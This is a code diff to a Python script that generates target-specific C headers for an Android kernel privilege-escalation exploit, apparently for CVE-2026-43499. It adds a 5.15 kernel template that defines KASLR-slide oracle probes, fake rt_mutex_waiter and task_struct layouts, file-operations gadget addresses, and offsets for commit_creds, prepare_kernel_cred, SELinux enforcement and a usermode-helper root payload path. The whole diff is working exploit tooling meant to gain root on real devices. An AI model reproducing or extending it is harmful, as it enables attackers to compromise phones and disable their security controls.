@@ -425,9 +425,8 @@ def gen_fingerprint(kernel: bytes, probe: int, out: Path, desc: str,
             if struct.unpack_from('<Q', kernel, src + po)[0] != words[i]:
                 raise SystemExit(f"readback mismatch for slide 0x{slide:x}")
     with out.open('w') as f:
-        f.write(f"// P0 fingerprint for {desc}.\n")
-        f.write("// Each row maps an actual P0/KASLR slide to bytes at raw "
-                "offset P0_ORACLE_PROBE_OFFSET - slide.\n")
+        f.write("// Generated from the exact raw Image.\n")
+        f.write(f"// Each row maps actual slide to Image[0x{probe:x} - slide].\n")
         if inverse:
             f.write("// APP_P0_FINGERPRINT_INVERSE_SLIDE=1: the row key is "
                     "the physical source offset; the runtime converts it "
@@ -452,7 +451,7 @@ def gen_fingerprint(kernel: bytes, probe: int, out: Path, desc: str,
         f.write("};\n\n#endif\n")
 
 
-TEMPLATE = r"""#ifndef OFFSET_H
+TEMPLATE_STANDARD = r"""#ifndef OFFSET_H
 #define OFFSET_H
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
@@ -468,6 +467,7 @@ TEMPLATE = r"""#ifndef OFFSET_H
 #endif
 
 #define KIMAGE_TEXT_BASE __BASE__
+#define PHYS_P0_ORACLE 1
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET __PHYS_OFF__
 #define P0_KERNEL_PHYS_LOAD __KERNEL_PHYS__
@@ -682,6 +682,246 @@ __FAKE_WAITER_MACROS__
 #endif
 """
 
+TEMPLATE_5_15 = r"""#ifndef OFFSET_H
+#define OFFSET_H
+
+/* ---------------------------------------------------------------------------
+ * Target identity & build flags
+ * ------------------------------------------------------------------------- */
+#define BUILD_VARIANT_LABEL "__PROFILE__-app"
+#define PHYS_P0_ORACLE 1
+#define SLIDE_ROUTE SLIDE_ROUTE_MCAST
+
+#ifndef BUILD_FINGERPRINT
+#define BUILD_FINGERPRINT \
+  "__FINGERPRINT__"
+#endif
+
+/* --- kmalloc layout (mm_struct slab shape) -------------------------------- */
+#ifndef MM_STRUCT_SZ
+#define MM_STRUCT_SZ __MM_SZ__
+#endif
+#define KMALLOC_CGROUP_TYPE 1
+#define KMALLOC_CACHE_TYPES 3
+
+/* ---------------------------------------------------------------------------
+ * Route / build tuning
+ * ------------------------------------------------------------------------- */
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#define FOPS_ROUTE_COARSE_DELAY_USEC 50000
+#define FOPS_ROUTE_FINE_DELAY_TICKS \
+  0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
+#define PRODUCTION_STACK_PI_RIGHT_ONLY 1
+
+#define DEFAULT_EXPLOIT_ATTEMPTS 8
+#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
+
+/* ---------------------------------------------------------------------------
+ * Kernel virtual address map
+ * ------------------------------------------------------------------------- */
+#define KIMAGE_TEXT_BASE __BASE__
+#define P0_PAGE_OFFSET 0xffffff8000000000ULL
+#ifndef P0_PHYS_OFFSET
+#define P0_PHYS_OFFSET __PHYS_OFF__
+#endif
+#ifndef P0_KERNEL_PHYS_LOAD
+#define P0_KERNEL_PHYS_LOAD __KERNEL_PHYS__
+#endif
+
+#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
+#define DIRECT_MAP_BASE 0xffffff8000000000ULL
+#define DIRECT_MAP_END 0xffffff9000000000ULL
+#define VMEMMAP_START 0xfffffffe00000000ULL
+
+/* ---------------------------------------------------------------------------
+ * P0 physical oracle (configfs gate/probe slots)
+ * ------------------------------------------------------------------------- */
+#define P0_ORACLE_GATE_SLOT 0
+#define P0_ORACLE_PROBE_SLOT 1
+#define P0_ORACLE_GATE_RESTORE_SLOT 2
+#define P0_ORACLE_PROBE_RESTORE_SLOT 3
+#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
+#define P0_ORACLE_GATE_OBJECT_INDEX 1
+#define P0_ORACLE_PROBE_OFFSET __PROBE_OFF__
+#define P0_FINGERPRINT_HEADER \
+  "targets/__PROFILE__/p0_fingerprint.h"
+
+/* ---------------------------------------------------------------------------
+ * KASLR slide (p0 offset candidates + tracefs worker)
+ * ------------------------------------------------------------------------- */
+#define SLIDE_P0_OFFSET_CANDIDATES \
+  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
+  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
+  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
+  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
+  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
+  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
+  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
+  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, __PROBE_OFF__
+#define SLIDE_MAX_ATTEMPTS 32
+#define SLIDE_KASLR_STEP __MM_SZ__0ULL
+#define SLIDE_TRACEFS_EVENT_ID __EVENT_ID__
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF __WORKER_CALL__ULL
+
+/* ---------------------------------------------------------------------------
+ * Slide / requeue-PI mechanism
+ * ------------------------------------------------------------------------- */
+#define SLIDE_FAKE_WAITER_PRIO 0
+#define SLIDE_WAIT_NSEC 2000000000L
+#define SLIDE_REQUEUE_ARM_USEC 20000
+#define SLIDE_USE_FAKE_TASK 1
+__WAITER_FLAG__#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
+
+/* --- slide kernelsnitch tuning ------------------------------------------- */
+#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
+#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
+#define SLIDE_KSNITCH_AVERAGE 8
+
+/* --- controlled-mm bank layout ------------------------------------------- */
+#define SLIDE_BANK_SLOTS 4
+#define SLIDE_BANK_TASK_OFF 0x1000
+#define SLIDE_BANK_TASK_STRIDE 0x1c0
+#define SLIDE_BANK_LOCK_OFF 0x5200
+#define SLIDE_BANK_SLOT_STRIDE 0x100
+#define SLIDE_BANK_WAITER_OFF 0x40
+
+/* ---------------------------------------------------------------------------
+ * Collision / reclaim tuning (device-specific)
+ * ------------------------------------------------------------------------- */
+#define SKB_SEND_SIZE 0x8e80
+#define SKB_RECLAIM_SENDS 64
+#define SLIDE_RECLAIM_SENDS 64
+
+/* ---------------------------------------------------------------------------
+ * Root escalation (cred offsets + usermode-helper)
+ * ------------------------------------------------------------------------- */
+#define TASK_STRUCT_CRED_OFF      __TASK_CRED__ULL
+#define TASK_STRUCT_REAL_CRED_OFF __TASK_REAL_CRED__ULL
+#define FAKE_TASK_TASK_GROUP_OFF  __TASK_SCHED_TG__ULL
+
+#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
+#define ROOT_UMH_WORK_OFF 0x6000
+#define ROOT_UMH_DATA_OFF 0x6200
+
+/* ---------------------------------------------------------------------------
+ * Static kernel symbol offsets (text-relative)
+ * ------------------------------------------------------------------------- */
+/* --- global / root symbols ------------------------------------------------ */
+#define INIT_TASK_OFF             __INIT_TASK__ULL
+#define PREPARE_KERNEL_CRED_OFF   __PREPARE_CRED__ULL
+#define COMMIT_CREDS_OFF          __COMMIT_CREDS__ULL
+#define OVERRIDE_CREDS_OFF        __OVERRIDE_CREDS__ULL
+#define ROOT_TASK_GROUP_OFF       __ROOT_TG__ULL
+#define SELINUX_ENFORCING_OFF     __SELINUX__ULL
+#define KMALLOC_CACHES_OFF        __KMALLOC__ULL
+#define ANON_PIPE_BUF_OPS_OFF     __ANON_PIPE__ULL
+#define SYSTEM_UNBOUND_WQ_OFF     __UNBOUND_WQ__ULL
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF __UMH__ULL
+
+/* --- ashmem / configfs / fops gadgets ------------------------------------- */
+#define ASHMEM_FOPS_OFF           __ASHMEM_FOPS__ULL
+#define ASHMEM_MISC_FOPS_OFF      __ASHMEM_MISC_FOPS__ULL
+#define ASHMEM_IOCTL_OFF          __ASHMEM_IOCTL__ULL
+#define ASHMEM_COMPAT_IOCTL_OFF   __ASHMEM_COMPAT__ULL
+#define ASHMEM_MMAP_OFF           __ASHMEM_MMAP__ULL
+#define ASHMEM_OPEN_OFF           __ASHMEM_OPEN__ULL
+#define ASHMEM_RELEASE_OFF        __ASHMEM_REL__ULL
+#define ASHMEM_SHOW_FDINFO_OFF    __ASHMEM_FDINFO__ULL
+#define CONFIGFS_READ_ITER_OFF    __CFG_READ__ULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF __CFG_WRITE__ULL
+#define COPY_SPLICE_READ_OFF      __SPLICE__ULL
+#define NOOP_LLSEEK_OFF           __NOOP_LLSEEK__ULL
+
+/* --- slide leak symbols ---------------------------------------------------- */
+#define SLIDE_NFULNL_LOGGER_NAME_OFF __NFULNL_NAME__ULL
+#define SLIDE_NFULNL_LOGGER_OBJECT_OFF __NFULNL_OBJ__ULL
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF __BOOTID_DATA__ULL
+#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
+#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
+#define SLIDE_SYSCTL_BOOTID_OFF __SYSCTL_BOOTID__ULL
+
+/* ---------------------------------------------------------------------------
+ * Derived image addresses (KIMAGE_TEXT_BASE + offset)
+ * ------------------------------------------------------------------------- */
+/* --- global / root symbols ------------------------------------------------ */
+#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
+#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
+
+/* --- ashmem / configfs / fops gadgets ------------------------------------- */
+#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
+#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
+#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
+#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
+#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
+#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
+#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
+#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
+#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
+#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
+#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
+#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
+
+/* --- slide leak symbols ---------------------------------------------------- */
+#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
+#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
+#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
+#define SLIDE_ROOT_TASK_GROUP_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
+#define SLIDE_SYSCTL_BOOTID_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+
+/* ---------------------------------------------------------------------------
+ * Payload page layout (controlled-mm scratch page)
+ * ------------------------------------------------------------------------- */
+#define LOCK_OFF 0x2210
+#define W0_OFF 0x2350
+#define FOPS_OFF 0x2000
+#define SCRATCH_OFF 0x3000
+#define RIGHT_OFF 0x4440
+#define LEFT_OFF 0x5550
+#define FAKE_TASK_OFF 0x3200
+
+/* --- fake rt_mutex_waiter layout ------------------------------------------ */
+__FAKE_WAITER_BLOCK__
+/* --- fake task_struct layout ---------------------------------------------- */
+__FAKE_TASK_BLOCK__
+/* ---------------------------------------------------------------------------
+ * configfs (configfs_bin_buffer) struct layout
+ * ------------------------------------------------------------------------- */
+__CFG_BLOCK__
+/* ---------------------------------------------------------------------------
+ * workqueue / worker-pool layout
+ * ------------------------------------------------------------------------- */
+__WQ_BLOCK__
+/* --- work_struct layout ---------------------------------------------------- */
+__WORK_BLOCK__
+/* ---------------------------------------------------------------------------
+ * struct page layout
+ * ------------------------------------------------------------------------- */
+__PAGE_BLOCK__
+/* ---------------------------------------------------------------------------
+ * pipe buffer
+ * ------------------------------------------------------------------------- */
+#define PIPE_BUFFER_SLOTS 32
+#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+
+/* ---------------------------------------------------------------------------
+ * file_operations struct layout
+ * ------------------------------------------------------------------------- */
+__FOPS_BLOCK__#endif
+"""
+
 
 def main():
     ap = argparse.ArgumentParser(
@@ -795,6 +1035,7 @@ def main():
 
     waiter = structs.get('rt_mutex_waiter', {})
     wnode = structs.get('rt_waiter_node', {})
+    compact = None
     if 'tree' in waiter and 'pi_tree' in waiter and wnode:
         # rt_waiter_node-based layout (>= 6.6): tree/pi_tree hold
         # {entry, prio, deadline}; no LEGACY/COMPACT flag needed (both
@@ -943,6 +1184,126 @@ def main():
               else 'generic_file_splice_read')
     selinux_enforcing = off('selinux_state') + f('selinux_state', 'enforcing')
 
+    a54x = (vmaj, vmin) == (5, 15)
+    if args.inverse_slide and a54x:
+        raise SystemExit("--inverse-slide is not supported for the a54x "
+                         "5.15 target format")
+
+    if a54x:
+        flat = 'tree' not in waiter
+        if not flat:
+            raise SystemExit("a54x (5.15) targets expect the flat "
+                             "rt_mutex_waiter layout")
+        a54x_vals = {
+            'MM_SZ': f'0x{mm_struct_sz:x}',
+            'TASK_CRED': f'0x{f("task_struct", "cred"):x}',
+            'TASK_REAL_CRED': f'0x{f("task_struct", "real_cred"):x}',
+            'TASK_SCHED_TG': f'0x{f("task_struct", "sched_task_group"):x}',
+            'ASHMEM_MISC_FOPS':
+                f'0x{off("ashmem_misc" if has_symbol(sym, "ashmem_misc")
+                         else "ashmem_miscs") + 0x10:08x}',
+            'PREPARE_CRED': ('0x%08x' % off('prepare_kernel_cred')
+                             if has_symbol(sym, 'prepare_kernel_cred')
+                             else None),
+            'COMMIT_CREDS': ('0x%08x' % off('commit_creds')
+                             if has_symbol(sym, 'commit_creds') else None),
+            'OVERRIDE_CREDS': ('0x%08x' % off('override_creds')
+                               if has_symbol(sym, 'override_creds') else None),
+            'WAITER_FLAG': ('#define COMPACT_RT_MUTEX_WAITER 1\n' if compact
+                            else '#define LEGACY_RT_MUTEX_WAITER 1\n'),
+            'FAKE_WAITER_BLOCK': "\n".join([
+                f"#define FAKE_WAITER_PI_TREE_ENTRY_OFF "
+                f"0x{waiter['pi_tree_entry']:x}",
+                f"#define FAKE_WAITER_TASK_OFF 0x{waiter['task']:x}",
+                f"#define FAKE_WAITER_LOCK_OFF 0x{waiter['lock']:x}",
+                f"#define FAKE_WAITER_WAKE_STATE_OFF "
+                f"0x{waiter['wake_state']:x}",
+                f"#define FAKE_WAITER_PRIO_OFF 0x{waiter['prio']:x}",
+                f"#define FAKE_WAITER_DEADLINE_OFF 0x{waiter['deadline']:x}",
+                f"#define FAKE_WAITER_WW_CTX_OFF 0x{waiter['ww_ctx']:x}",
+            ]) + "\n",
+            'FAKE_TASK_BLOCK': "\n".join([
+                f"#define FAKE_TASK_USAGE_OFF 0x{f('task_struct', 'usage'):x}",
+                f"#define FAKE_TASK_PRIO_OFF 0x{f('task_struct', 'prio'):x}",
+                f"#define FAKE_TASK_NORMAL_PRIO_OFF "
+                f"0x{f('task_struct', 'normal_prio'):x}",
+                f"#define FAKE_TASK_PI_LOCK_OFF "
+                f"0x{f('task_struct', 'pi_lock'):x}",
+                f"#define FAKE_TASK_PI_WAITERS_OFF "
+                f"0x{f('task_struct', 'pi_waiters'):x}",
+                f"#define FAKE_TASK_PI_TOP_TASK_OFF "
+                f"0x{f('task_struct', 'pi_top_task'):x}",
+                f"#define FAKE_TASK_PI_BLOCKED_ON_OFF "
+                f"0x{f('task_struct', 'pi_blocked_on'):x}",
+            ]) + "\n",
+            'CFG_BLOCK': "\n".join([
+                f"#define CFG_PAGE_OFF {f('configfs_buffer', 'page')}",
+                f"#define CFG_NEEDS_READ_FILL_OFF "
+                f"{f('configfs_buffer', 'needs_read_fill')}",
+                f"#define CFG_BIN_BUFFER_OFF "
+                f"{f('configfs_buffer', 'bin_buffer')}",
+                f"#define CFG_BIN_BUFFER_SIZE_OFF "
+                f"{f('configfs_buffer', 'bin_buffer_size')}",
+                f"#define CFG_CB_MAX_SIZE_OFF "
+                f"{f('configfs_buffer', 'cb_max_size')}",
+            ]) + "\n",
+            'WQ_BLOCK': "\n".join([
+                f"#define WQ_DFL_PWQ_OFF 0x{f('workqueue_struct', 'dfl_pwq'):x}",
+                f"#define PWQ_POOL_OFF 0x{f('pool_workqueue', 'pool'):02x}",
+                f"#define PWQ_WQ_OFF 0x{f('pool_workqueue', 'wq'):02x}",
+                f"#define PWQ_WORK_COLOR_OFF "
+                f"0x{f('pool_workqueue', 'work_color'):02x}",
+                f"#define PWQ_REFCNT_OFF 0x{f('pool_workqueue', 'refcnt'):02x}",
+                f"#define PWQ_NR_IN_FLIGHT_OFF "
+                f"0x{f('pool_workqueue', 'nr_in_flight'):02x}",
+                f"#define PWQ_NR_ACTIVE_OFF "
+                f"0x{f('pool_workqueue', 'nr_active'):02x}",
+                f"#define PWQ_MAX_ACTIVE_OFF "
+                f"0x{f('pool_workqueue', 'max_active'):02x}",
+                f"#define POOL_WORKLIST_OFF "
+                f"0x{f('worker_pool', 'worklist'):02x}",
+                f"#define POOL_NR_IDLE_OFF 0x{f('worker_pool', 'nr_idle'):02x}",
+            ]) + "\n",
+            'WORK_BLOCK': "\n".join([
+                f"#define WORK_DATA_OFF 0x{f('work_struct', 'data'):02x}",
+                f"#define WORK_ENTRY_OFF 0x{f('work_struct', 'entry'):02x}",
+                f"#define WORK_FUNC_OFF 0x{f('work_struct', 'func'):02x}",
+            ]) + "\n",
+            'PAGE_BLOCK': "\n".join([
+                f"#define STRUCT_PAGE_SIZE 0x{struct_size(btf_raw, 'page'):x}",
+                f"#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08",
+                f"#define STRUCT_SLAB_CACHE_OFF 0x{slab_cache_off:02x}",
+                f"#define STRUCT_PAGE_TYPE_OFF 0x30",
+            ]) + "\n",
+            'FOPS_BLOCK': "\n".join([
+                f"#define FOPS_OWNER_OFF 0x{f('file_operations', 'owner'):02x}",
+                f"#define FOPS_LLSEEK_OFF 0x{f('file_operations', 'llseek'):02x}",
+                f"#define FOPS_READ_OFF 0x{f('file_operations', 'read'):02x}",
+                f"#define FOPS_WRITE_OFF 0x{f('file_operations', 'write'):02x}",
+                f"#define FOPS_READ_ITER_OFF "
+                f"0x{f('file_operations', 'read_iter'):02x}",
+                f"#define FOPS_WRITE_ITER_OFF "
+                f"0x{f('file_operations', 'write_iter'):02x}",
+                f"#define FOPS_IOCTL_OFF "
+                f"0x{f('file_operations', 'unlocked_ioctl'):02x}",
+                f"#define FOPS_COMPAT_IOCTL_OFF "
+                f"0x{f('file_operations', 'compat_ioctl'):02x}",
+                f"#define FOPS_MMAP_OFF 0x{f('file_operations', 'mmap'):02x}",
+                f"#define FOPS_OPEN_OFF 0x{f('file_operations', 'open'):02x}",
+                f"#define FOPS_RELEASE_OFF "
+                f"0x{f('file_operations', 'release'):02x}",
+                f"#define FOPS_SPLICE_READ_OFF "
+                f"0x{f('file_operations', 'splice_read'):02x}",
+                f"#define FOPS_SHOW_FDINFO_OFF "
+                f"0x{f('file_operations', 'show_fdinfo'):02x}",
+            ]) + "\n",
+        }
+        for k in ('PREPARE_CRED', 'COMMIT_CREDS', 'OVERRIDE_CREDS'):
+            if a54x_vals[k] is None:
+                del a54x_vals[k]
+    else:
+        a54x_vals = {}
+
     vals = {
         'PROFILE': profile, 'FINGERPRINT': fingerprint, 'BUILD': build,
         'BASE': f'0x{base:x}ULL',
@@ -1033,10 +1394,12 @@ def main():
                        if args.inverse_slide else ""),
     }
 
+    vals.update(a54x_vals)
+
     out = args.out or Path('src') / 'targets' / profile
     out.mkdir(parents=True, exist_ok=True)
     target_out = out / 'target.h'
-    target_h = TEMPLATE
+    target_h = TEMPLATE_5_15 if a54x else TEMPLATE_STANDARD
     for key, val in vals.items():
         target_h = target_h.replace(f'__{key}__', val)
     if event_id is None:
